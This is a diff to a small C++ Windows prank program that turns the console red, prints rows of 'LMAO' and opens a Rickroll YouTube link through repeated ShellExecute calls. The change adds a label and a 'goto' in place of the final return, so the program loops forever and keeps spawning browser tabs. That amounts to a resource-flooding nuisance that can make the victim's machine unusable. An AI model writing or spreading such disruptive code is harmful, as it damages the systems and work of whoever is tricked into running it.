@@ -12,6 +12,7 @@
 int main(int argc, char* argv[])
 {
     system("Color 0C");
+ok:
     std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
     std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
     std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
@@ -69,5 +70,7 @@ int main(int argc, char* argv[])
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    return 0;
+    goto ok;
+
+return 0;
 }
